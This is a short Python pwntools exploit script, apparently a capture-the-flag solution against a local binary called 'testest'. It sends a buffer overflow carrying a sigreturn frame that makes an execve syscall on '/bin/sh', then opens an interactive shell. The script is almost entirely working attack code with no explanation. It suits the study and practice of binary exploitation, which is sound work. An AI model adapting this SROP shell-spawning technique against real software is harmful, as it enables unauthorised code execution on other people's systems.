from pwn import *

p=process("./testest")
e=ELF("./testest")
context.clear(arch='amd64')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

gdb.attach(p)
pause()

#eax_0=e.symbols["main"]+60
main=e.symbols["main"]
syscall=main+58
bss=e.bss()+0x100
binsh=b"/bin/sh\x00"

frame1=SigreturnFrame(kernel='amd64')
frame1.rip=syscall
frame1.rsp=syscall
#frame1.rax=0x40000000 | 0x3b  #execve
frame1.rax=0x3b
frame1.rdi=bss
frame1.rsi=0
frame1.rdx=0

p.send(b'A'*0x10+p64(bss+0x10)+p64(main+24)+b'B'*0x8+p64(syscall)+bytes(frame1))
pause()
p.send(binsh+b'C'*7)
pause()

p.interactive()
